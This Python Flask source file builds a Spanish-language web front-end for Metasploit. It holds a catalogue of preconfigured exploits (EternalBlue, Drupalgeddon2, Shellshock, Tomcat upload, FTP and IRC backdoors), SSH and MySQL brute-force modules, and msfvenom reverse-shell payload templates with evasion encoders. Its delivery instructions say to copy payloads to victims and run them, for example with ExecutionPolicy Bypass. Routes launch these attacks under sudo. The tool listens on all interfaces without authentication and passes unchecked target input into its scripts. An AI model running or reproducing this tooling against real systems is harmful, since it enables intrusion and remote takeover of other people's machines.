#!/usr/bin/env python3
"""
MSF-Assistant v3 - Herramienta de pentesting con interfaz web local
Incluye: escaneo, exploits, payloads msfvenom, post-explotacion
Ejecutar en Kali Linux: sudo python3 app.py
Acceder en: http://localhost:5000
"""

from flask import Flask, render_template, request, jsonify, Response, send_file
import subprocess, os, re, shutil, json
from datetime import datetime

app = Flask(__name__)

# ─────────────────────────────────────────────
# UTILIDADES
# ─────────────────────────────────────────────

def check_tool(tool):
    return shutil.which(tool) is not None

def get_interfaces():
    try:
        result = subprocess.run(['ip', '-o', 'addr', 'show'], capture_output=True, text=True)
        ifaces = []
        seen = set()
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                iface = parts[1]
                if iface not in seen and iface != 'lo':
                    seen.add(iface)
                    ip = ''
                    for p in parts:
                        if re.match(r'\d+\.\d+\.\d+\.\d+', p):
                            ip = p.split('/')[0]
                            break
                    ifaces.append({'name': iface, 'ip': ip})
        return ifaces
    except:
        return [{'name': 'eth0', 'ip': ''}]

def get_local_ip():
    try:
        result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
        ips = result.stdout.strip().split()
        return ips[0] if ips else '127.0.0.1'
    except:
        return '127.0.0.1'

def is_root():
    return os.geteuid() == 0

# ─────────────────────────────────────────────
# BASE DE DATOS DE EXPLOITS
# ─────────────────────────────────────────────

EXPLOITS = [
    {'id':'drupalgeddon2','name':'exploit/unix/webapp/drupal_drupalgeddon2','short':'Drupalgeddon2','desc':'RCE en Drupal 7.x/8.x sin autenticacion','port':'80/tcp','rank':'excellent','cve':'CVE-2018-7600','payload':'php/meterpreter/reverse_tcp','cat':'web','targets':['Metasploitable 3','cualquier Drupal 7/8'],'opts':{'RHOSTS':'','RPORT':'80','TARGETURI':'/','LHOST':'','LPORT':'4444'},'sev':98,'note':'No necesita credenciales. Funciona en cualquier Drupal 7.x o 8.x expuesto en el puerto 80.'},
    {'id':'ms17_010','name':'exploit/windows/smb/ms17_010_eternalblue','short':'EternalBlue (MS17-010)','desc':'RCE en SMBv1 Windows 7/2008 sin parche','port':'445/tcp','rank':'excellent','cve':'CVE-2017-0144','payload':'windows/x64/meterpreter/reverse_tcp','cat':'smb','targets':['Windows 7','Windows 2008 R2','Windows XP'],'opts':{'RHOSTS':'','RPORT':'445','LHOST':'','LPORT':'4444'},'sev':100,'note':'Requiere SMBv1 habilitado y que la maquina no tenga el parche MS17-010.'},
    {'id':'ms08_067','name':'exploit/windows/smb/ms08_067_netapi','short':'MS08-067 NetAPI','desc':'RCE en Windows XP/2003 via SMB','port':'445/tcp','rank':'excellent','cve':'CVE-2008-4250','payload':'windows/meterpreter/reverse_tcp','cat':'smb','targets':['Windows XP SP2/SP3','Windows 2003'],'opts':{'RHOSTS':'','RPORT':'445','LHOST':'','LPORT':'4444'},'sev':97,'note':'Clasico de labs. Muy estable en Windows XP SP2/SP3 y Server 2003.'},
    {'id':'unreal_ircd','name':'exploit/unix/irc/unreal_ircd_3281_backdoor','short':'UnrealIRCd 3.2.8.1 Backdoor','desc':'Backdoor en el binario del servidor IRC','port':'6667/tcp','rank':'excellent','cve':'CVE-2010-2075','payload':'cmd/unix/reverse','cat':'irc','targets':['Metasploitable 2','Metasploitable 3'],'opts':{'RHOSTS':'','RPORT':'6667','LHOST':'','LPORT':'4444'},'sev':95,'note':'Shell inmediata sin credenciales. Solo funciona si el puerto 6667 esta abierto.'},
    {'id':'proftpd_backdoor','name':'exploit/unix/ftp/proftpd_133c_backdoor','short':'ProFTPd 1.3.3c Backdoor','desc':'Backdoor en el codigo fuente comprometido de ProFTPd','port':'21/tcp','rank':'excellent','cve':'CVE-2010-4221','payload':'cmd/unix/reverse','cat':'ftp','targets':['Metasploitable 2','Metasploitable 3'],'opts':{'RHOSTS':'','RPORT':'21','LHOST':'','LPORT':'4444'},'sev':90,'note':'No requiere credenciales. Backdoor inyectado en version 1.3.3c del codigo fuente.'},
    {'id':'vsftpd_234','name':'exploit/unix/ftp/vsftpd_234_backdoor','short':'vsftpd 2.3.4 Backdoor','desc':'Backdoor en vsftpd 2.3.4 de SourceForge','port':'21/tcp','rank':'excellent','cve':'CVE-2011-2523','payload':'cmd/unix/interact','cat':'ftp','targets':['Metasploitable 2'],'opts':{'RHOSTS':'','RPORT':'21'},'sev':92,'note':'Crea una bind shell en el puerto 6200. No necesita LHOST ni LPORT.'},
    {'id':'tomcat_mgr','name':'exploit/multi/http/tomcat_mgr_upload','short':'Tomcat Manager Upload','desc':'Sube WAR malicioso al manager de Tomcat con credenciales por defecto','port':'8080/tcp','rank':'excellent','cve':'CVE-2009-3843','payload':'java/meterpreter/reverse_tcp','cat':'web','targets':['Metasploitable 3','cualquier Tomcat con creds debiles'],'opts':{'RHOSTS':'','RPORT':'8080','HTTPUSERNAME':'tomcat','HTTPPASSWORD':'tomcat','LHOST':'','LPORT':'4444'},'sev':88,'note':'Credenciales por defecto: tomcat/tomcat. Verifica primero: http://TARGET:8080/manager'},
    {'id':'shellshock','name':'exploit/multi/http/apache_mod_cgi_bash_env_exec','short':'Shellshock (CGI)','desc':'RCE via variable de entorno en bash CGI','port':'80/tcp','rank':'excellent','cve':'CVE-2014-6271','payload':'linux/x86/meterpreter/reverse_tcp','cat':'web','targets':['Metasploitable 2','Apache con CGI'],'opts':{'RHOSTS':'','RPORT':'80','TARGETURI':'/cgi-bin/status','LHOST':'','LPORT':'4444'},'sev':93,'note':'Funciona si el servidor usa bash menor o igual a 4.3 con scripts CGI.'},
    {'id':'heartbleed','name':'auxiliary/scanner/ssl/openssl_heartbleed','short':'Heartbleed (OpenSSL)','desc':'Lee hasta 64KB de memoria del servidor SSL','port':'443/tcp','rank':'great','cve':'CVE-2014-0160','payload':'(scanner)','cat':'net','targets':['cualquier servidor con OpenSSL 1.0.1 a 1.0.1f'],'opts':{'RHOSTS':'','RPORT':'443','VERBOSE':'true'},'sev':85,'note':'Puede extraer claves privadas, cookies y contrasenas en texto claro.'},
    {'id':'ssh_login','name':'auxiliary/scanner/ssh/ssh_login','short':'SSH Login Bruteforce','desc':'Fuerza bruta SSH con diccionario','port':'22/tcp','rank':'good','cve':'—','payload':'(scanner)','cat':'ssh','targets':['cualquier servidor SSH','Metasploitable 2/3'],'opts':{'RHOSTS':'','RPORT':'22','USERNAME':'root','PASS_FILE':'/usr/share/wordlists/rockyou.txt','THREADS':'10','VERBOSE':'false'},'sev':60,'note':'Combinaciones comunes: root/toor, vagrant/vagrant, msfadmin/msfadmin.'},
    {'id':'mysql_login','name':'auxiliary/scanner/mysql/mysql_login','short':'MySQL Login Scanner','desc':'Fuerza bruta a servidor MySQL','port':'3306/tcp','rank':'good','cve':'—','payload':'(scanner)','cat':'db','targets':['Metasploitable 2','cualquier MySQL expuesto'],'opts':{'RHOSTS':'','RPORT':'3306','USERNAME':'root','PASSWORD':'','THREADS':'10'},'sev':65,'note':'MySQL en Metasploitable 2 tiene root sin contrasena. Prueba con PASSWORD vacio.'},
    {'id':'handler','name':'exploit/multi/handler','short':'Multi/Handler (listener)','desc':'Listener para recibir conexiones de payloads externos','port':'cualquiera','rank':'excellent','cve':'—','payload':'linux/x86/meterpreter/reverse_tcp','cat':'net','targets':['universal'],'opts':{'LHOST':'','LPORT':'4444'},'sev':0,'note':'Usar cuando ya tienes un payload ejecutado manualmente en la victima.'},
]

# ─────────────────────────────────────────────
# PAYLOADS MSFVENOM
# ─────────────────────────────────────────────

PAYLOAD_TEMPLATES = {
    'linux_x86_reverse': {
        'name': 'Linux x86 — Reverse Shell (ELF)',
        'payload': 'linux/x86/meterpreter/reverse_tcp',
        'platform': 'linux', 'arch': 'x86', 'fmt': 'elf',
        'ext': 'bin', 'os': 'Linux',
        'note': 'Ejecutable ELF para Linux 32-bit. Subir y ejecutar en la victima.',
        'deliver': 'Subir con: scp payload.bin user@victima:/tmp/ && ssh user@victima chmod +x /tmp/payload.bin && /tmp/payload.bin'
    },
    'linux_x64_reverse': {
        'name': 'Linux x64 — Reverse Shell (ELF)',
        'payload': 'linux/x64/meterpreter/reverse_tcp',
        'platform': 'linux', 'arch': 'x64', 'fmt': 'elf',
        'ext': 'bin', 'os': 'Linux',
        'note': 'Ejecutable ELF para Linux 64-bit. El mas comun en sistemas modernos.',
        'deliver': 'chmod +x payload.bin && ./payload.bin'
    },
    'windows_x64_reverse': {
        'name': 'Windows x64 — Reverse Shell (EXE)',
        'payload': 'windows/x64/meterpreter/reverse_tcp',
        'platform': 'windows', 'arch': 'x64', 'fmt': 'exe',
        'ext': 'exe', 'os': 'Windows',
        'note': 'Ejecutable .exe para Windows 64-bit. Compatible con Win7/10/11.',
        'deliver': 'Copiar a la victima y ejecutar. Usar multi/handler como listener.'
    },
    'windows_x86_reverse': {
        'name': 'Windows x86 — Reverse Shell (EXE)',
        'payload': 'windows/meterpreter/reverse_tcp',
        'platform': 'windows', 'arch': 'x86', 'fmt': 'exe',
        'ext': 'exe', 'os': 'Windows',
        'note': 'Ejecutable .exe para Windows 32-bit. Funciona en sistemas de 32 y 64 bits.',
        'deliver': 'Copiar a la victima y ejecutar doble clic o desde CMD.'
    },
    'php_reverse': {
        'name': 'PHP — Reverse Shell (webshell)',
        'payload': 'php/meterpreter/reverse_tcp',
        'platform': 'php', 'arch': 'php', 'fmt': 'raw',
        'ext': 'php', 'os': 'Web (PHP)',
        'note': 'Webshell PHP. Subir a un servidor web vulnerable y acceder via navegador.',
        'deliver': 'Subir via upload vulnerable, LFI, o FTP. Acceder: http://victima/shell.php'
    },
    'python_reverse': {
        'name': 'Python — Reverse Shell',
        'payload': 'cmd/unix/reverse_python',
        'platform': 'python', 'arch': 'python', 'fmt': 'raw',
        'ext': 'py', 'os': 'Linux/Mac (Python)',
        'note': 'Script Python. Util si la victima tiene Python instalado.',
        'deliver': 'python3 payload.py o python payload.py'
    },
    'bash_reverse': {
        'name': 'Bash — Reverse Shell (one-liner)',
        'payload': 'cmd/unix/reverse_bash',
        'platform': 'unix', 'arch': 'cmd', 'fmt': 'raw',
        'ext': 'sh', 'os': 'Linux/Unix (Bash)',
        'note': 'One-liner bash. Muy util para inyectar en vulnerabilidades command injection.',
        'deliver': 'bash payload.sh o ejecutar el contenido directamente en la victima'
    },
    'java_war': {
        'name': 'Java — WAR (Tomcat/JBoss)',
        'payload': 'java/meterpreter/reverse_tcp',
        'platform': 'java', 'arch': 'java', 'fmt': 'war',
        'ext': 'war', 'os': 'Tomcat / JBoss / GlassFish',
        'note': 'Archivo WAR para desplegar en servidores Java. Ideal para Tomcat Manager.',
        'deliver': 'Subir via Tomcat Manager: http://victima:8080/manager -> Deploy WAR'
    },
    'aspx_reverse': {
        'name': 'ASP.NET — Reverse Shell (ASPX)',
        'payload': 'windows/x64/meterpreter/reverse_tcp',
        'platform': 'windows', 'arch': 'x64', 'fmt': 'aspx',
        'ext': 'aspx', 'os': 'Windows (IIS)',
        'note': 'Webshell ASPX para IIS en Windows. Subir a directorio web accesible.',
        'deliver': 'Subir a servidor IIS y acceder: http://victima/shell.aspx'
    },
    'powershell_reverse': {
        'name': 'PowerShell — Reverse Shell (PS1)',
        'payload': 'windows/x64/meterpreter/reverse_tcp',
        'platform': 'windows', 'arch': 'x64', 'fmt': 'psh',
        'ext': 'ps1', 'os': 'Windows (PowerShell)',
        'note': 'Script PowerShell. Ejecutar en victima Windows con PowerShell habilitado.',
        'deliver': 'powershell -ExecutionPolicy Bypass -File payload.ps1'
    },
}

ENCODERS = {
    'none':     {'name': 'Sin encoder (raw)', 'flag': ''},
    'x86_shikata': {'name': 'x86/shikata_ga_nai (mejor para x86)', 'flag': '-e x86/shikata_ga_nai -i 5'},
    'x64_xor':  {'name': 'x64/xor_dynamic (para x64)', 'flag': '-e x64/xor_dynamic -i 3'},
    'base64':   {'name': 'php/base64 (para PHP)', 'flag': '-e php/base64'},
    'unicode':  {'name': 'x86/unicode_mixed', 'flag': '-e x86/unicode_mixed -i 3'},
}

# ─────────────────────────────────────────────
# RUTAS PRINCIPALES
# ─────────────────────────────────────────────

@app.route('/')
def index():
    interfaces = get_interfaces()
    local_ip = get_local_ip()
    root = is_root()
    return render_template('index.html',
                           interfaces=interfaces,
                           local_ip=local_ip,
                           is_root=root,
                           exploits=EXPLOITS,
                           payload_templates=PAYLOAD_TEMPLATES,
                           encoders=ENCODERS)

@app.route('/api/interfaces')
def api_interfaces():
    return jsonify(get_interfaces())

@app.route('/api/localip')
def api_localip():
    return jsonify({'ip': get_local_ip()})

@app.route('/api/check-tools')
def api_check_tools():
    return jsonify({
        'netdiscover': check_tool('netdiscover'),
        'nmap': check_tool('nmap'),
        'msfconsole': check_tool('msfconsole'),
        'msfvenom': check_tool('msfvenom'),
        'is_root': is_root(),
    })

@app.route('/api/exploits')
def api_exploits():
    cat = request.args.get('cat', 'all')
    q = request.args.get('q', '').lower()
    result = EXPLOITS
    if cat != 'all':
        result = [e for e in result if e['cat'] == cat]
    if q:
        result = [e for e in result if
                  q in e['short'].lower() or q in e['desc'].lower() or
                  q in e['cve'].lower() or q in e['port'].lower()]
    return jsonify(result)

@app.route('/api/payload-templates')
def api_payload_templates():
    return jsonify(PAYLOAD_TEMPLATES)

# ─────────────────────────────────────────────
# SCAN STREAMING
# ─────────────────────────────────────────────

@app.route('/api/scan/stream')
def api_scan_stream():
    tool = request.args.get('tool', 'nmap-ping')
    network = request.args.get('network', '192.168.56.0/24')
    iface = request.args.get('iface', 'eth0')

    if tool == 'netdiscover':
        cmd = ['sudo', 'netdiscover', '-r', network, '-i', iface, '-P', '-N']
    elif tool == 'nmap-ping':
        cmd = ['sudo', 'nmap', '-sn', network, '--open']
    else:
        cmd = ['sudo', 'nmap', '-sV', '--open', '-T4', network]

    def generate():
        yield f"data: CMD: {' '.join(cmd)}\n\n"
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in proc.stdout:
                line = line.rstrip()
                if line:
                    yield f"data: {line}\n\n"
            proc.wait()
            yield "data: __DONE__\n\n"
        except FileNotFoundError as e:
            yield f"data: ERROR: Herramienta no encontrada — {e}\n\n"
            yield "data: __DONE__\n\n"
        except Exception as e:
            yield f"data: ERROR: {str(e)}\n\n"
            yield "data: __DONE__\n\n"

    return Response(generate(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

# ─────────────────────────────────────────────
# MSF EXPLOIT STREAMING
# ─────────────────────────────────────────────

@app.route('/api/msf/stream')
def api_msf_stream():
    exploit_id = request.args.get('exploit')
    target_ip = request.args.get('target', '')
    lhost = request.args.get('lhost', get_local_ip())
    lport = request.args.get('lport', '4444')

    exploit = next((e for e in EXPLOITS if e['id'] == exploit_id), None)
    if not exploit:
        return jsonify({'error': 'Exploit no encontrado'}), 404

    rc_lines = [f"use {exploit['name']}"]
    if 'RHOSTS' in exploit['opts']: rc_lines.append(f"set RHOSTS {target_ip}")
    if 'RPORT' in exploit['opts']: rc_lines.append(f"set RPORT {exploit['opts']['RPORT']}")
    if 'LHOST' in exploit['opts']: rc_lines.append(f"set LHOST {lhost}")
    if 'LPORT' in exploit['opts']: rc_lines.append(f"set LPORT {lport}")
    if 'TARGETURI' in exploit['opts']: rc_lines.append(f"set TARGETURI {exploit['opts']['TARGETURI']}")
    if 'HTTPUSERNAME' in exploit['opts']:
        rc_lines.append(f"set HTTPUSERNAME {exploit['opts']['HTTPUSERNAME']}")
        rc_lines.append(f"set HTTPPASSWORD {exploit['opts']['HTTPPASSWORD']}")
    if 'USERNAME' in exploit['opts']: rc_lines.append(f"set USERNAME {exploit['opts']['USERNAME']}")
    if 'PASS_FILE' in exploit['opts']: rc_lines.append(f"set PASS_FILE {exploit['opts']['PASS_FILE']}")
    if 'THREADS' in exploit['opts']: rc_lines.append(f"set THREADS {exploit['opts']['THREADS']}")
    if exploit['payload'] and not exploit['payload'].startswith('('):
        rc_lines.append(f"set payload {exploit['payload']}")
    rc_lines += ["run", "exit -y"]

    rc_path = f"/tmp/msf_assist_{exploit_id}.rc"

    def generate():
        yield f"data: [*] Modulo: {exploit['name']}\n\n"
        yield f"data: [*] Target: {target_ip} | LHOST: {lhost}:{lport}\n\n"
        yield "data: " + "─"*48 + "\n\n"
        for line in rc_lines:
            yield f"data: msf6 > {line}\n\n"
        yield "data: " + "─"*48 + "\n\n"
        yield "data: [*] Ejecutando msfconsole -r ...\n\n"
        try:
            with open(rc_path, 'w') as f:
                f.write("\n".join(rc_lines))
            proc = subprocess.Popen(['sudo', 'msfconsole', '-q', '-r', rc_path],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in proc.stdout:
                line = line.rstrip()
                if line:
                    yield f"data: {line}\n\n"
            proc.wait()
            try: os.remove(rc_path)
            except: pass
            yield "data: [*] Proceso finalizado.\n\n"
            yield "data: __DONE__\n\n"
        except FileNotFoundError:
            yield "data: ERROR: msfconsole no encontrado. Instala Metasploit Framework.\n\n"
            yield "data: __DONE__\n\n"
        except Exception as e:
            yield f"data: ERROR: {str(e)}\n\n"
            yield "data: __DONE__\n\n"

    return Response(generate(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

# ─────────────────────────────────────────────
# MSFVENOM — GENERAR PAYLOAD
# ─────────────────────────────────────────────

@app.route('/api/payload/build', methods=['POST'])
def api_payload_build():
    data = request.json
    template_id = data.get('template')
    lhost = data.get('lhost', get_local_ip())
    lport = data.get('lport', '4444')
    encoder_id = data.get('encoder', 'none')
    badchars = data.get('badchars', '')
    iterations = data.get('iterations', '5')

    tpl = PAYLOAD_TEMPLATES.get(template_id)
    if not tpl:
        return jsonify({'error': 'Template no encontrado'}), 404

    enc = ENCODERS.get(encoder_id, ENCODERS['none'])
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    outfile = f"/tmp/payload_{template_id}_{timestamp}.{tpl['ext']}"

    cmd = ['msfvenom', '-p', tpl['payload']]
    if 'LHOST' not in tpl['payload'] and tpl['fmt'] not in ['raw'] or tpl['payload'] not in ['cmd/unix/reverse_python','cmd/unix/reverse_bash']:
        cmd += [f"LHOST={lhost}", f"LPORT={lport}"]
    cmd += ['-f', tpl['fmt']]
    if enc['flag']:
        for part in enc['flag'].split():
            cmd.append(part)
    if badchars:
        cmd += ['-b', badchars]
    cmd += ['-o', outfile]

    # Construir el comando real limpio
    cmd_clean = ['msfvenom', '-p', tpl['payload'],
                 f'LHOST={lhost}', f'LPORT={lport}',
                 '-f', tpl['fmt']]
    if enc['flag']:
        cmd_clean += enc['flag'].split()
    if badchars:
        cmd_clean += ['-b', badchars]
    cmd_clean += ['-o', outfile]

    return jsonify({
        'cmd': ' '.join(cmd_clean),
        'outfile': outfile,
        'template': tpl,
        'encoder': enc,
        'lhost': lhost,
        'lport': lport,
    })

@app.route('/api/payload/stream')
def api_payload_stream():
    template_id = request.args.get('template')
    lhost = request.args.get('lhost', get_local_ip())
    lport = request.args.get('lport', '4444')
    encoder_id = request.args.get('encoder', 'none')
    badchars = request.args.get('badchars', '')

    tpl = PAYLOAD_TEMPLATES.get(template_id)
    if not tpl:
        def err():
            yield "data: ERROR: Template no encontrado\n\n"
            yield "data: __DONE__\n\n"
        return Response(err(), mimetype='text/event-stream')

    enc = ENCODERS.get(encoder_id, ENCODERS['none'])
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    outfile = f"/tmp/payload_{template_id}_{timestamp}.{tpl['ext']}"

    cmd = ['msfvenom', '-p', tpl['payload'],
           f'LHOST={lhost}', f'LPORT={lport}',
           '-f', tpl['fmt']]
    if enc['flag']:
        cmd += enc['flag'].split()
    if badchars:
        cmd += ['-b', badchars]
    cmd += ['-o', outfile]

    def generate():
        yield f"data: [*] Generando payload: {tpl['name']}\n\n"
        yield f"data: [*] Payload: {tpl['payload']}\n\n"
        yield f"data: [*] LHOST: {lhost} | LPORT: {lport}\n\n"
        yield f"data: [*] Formato: {tpl['fmt']} | Encoder: {enc['name']}\n\n"
        yield "data: " + "─"*48 + "\n\n"
        yield f"data: $ {' '.join(cmd)}\n\n"
        yield "data: " + "─"*48 + "\n\n"
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in proc.stdout:
                line = line.rstrip()
                if line:
                    yield f"data: {line}\n\n"
            proc.wait()
            if proc.returncode == 0 and os.path.exists(outfile):
                size = os.path.getsize(outfile)
                yield f"data: [+] Payload generado exitosamente!\n\n"
                yield f"data: [+] Archivo: {outfile}\n\n"
                yield f"data: [+] Tamano: {size} bytes\n\n"
                yield f"data: [+] Como usarlo: {tpl['deliver']}\n\n"
                yield f"data: __FILE__:{outfile}:{tpl['ext']}\n\n"
            else:
                yield f"data: [-] Error generando el payload (codigo: {proc.returncode})\n\n"
            yield "data: __DONE__\n\n"
        except FileNotFoundError:
            yield "data: ERROR: msfvenom no encontrado. Instala Metasploit Framework.\n\n"
            yield "data: __DONE__\n\n"
        except Exception as e:
            yield f"data: ERROR: {str(e)}\n\n"
            yield "data: __DONE__\n\n"

    return Response(generate(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

@app.route('/api/payload/download')
def api_payload_download():
    filepath = request.args.get('file')
    if not filepath or not os.path.exists(filepath) or not filepath.startswith('/tmp/payload_'):
        return "Archivo no encontrado", 404
    return send_file(filepath, as_attachment=True)

@app.route('/api/rc/download')
def api_rc_download():
    exploit_id = request.args.get('exploit')
    target_ip = request.args.get('target', 'TARGET_IP')
    lhost = request.args.get('lhost', get_local_ip())
    lport = request.args.get('lport', '4444')
    exploit = next((e for e in EXPLOITS if e['id'] == exploit_id), None)
    if not exploit:
        return "Not found", 404
    lines = [f"# MSF-Assistant — {exploit['short']}", f"# Target: {target_ip}",
             f"use {exploit['name']}"]
    if 'RHOSTS' in exploit['opts']: lines.append(f"set RHOSTS {target_ip}")
    if 'RPORT' in exploit['opts']: lines.append(f"set RPORT {exploit['opts']['RPORT']}")
    if 'LHOST' in exploit['opts']: lines.append(f"set LHOST {lhost}")
    if 'LPORT' in exploit['opts']: lines.append(f"set LPORT {lport}")
    if exploit['payload'] and not exploit['payload'].startswith('('):
        lines.append(f"set payload {exploit['payload']}")
    lines += ["show options", "run"]
    return Response("\n".join(lines), mimetype='text/plain',
                    headers={'Content-Disposition': f'attachment; filename={exploit_id}.rc'})

if __name__ == '__main__':
    print("\n" + "="*55)
    print("  MSF-Assistant v3 — Pentesting Web Tool")
    print("="*55)
    if not is_root():
        print("  AVISO: Ejecutar con sudo para acceso completo")
        print("  ->  sudo python3 app.py")
    else:
        print("  OK  Ejecutando como root")
    print(f"  OK  Interfaz: http://localhost:5000")
    print("="*55 + "\n")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
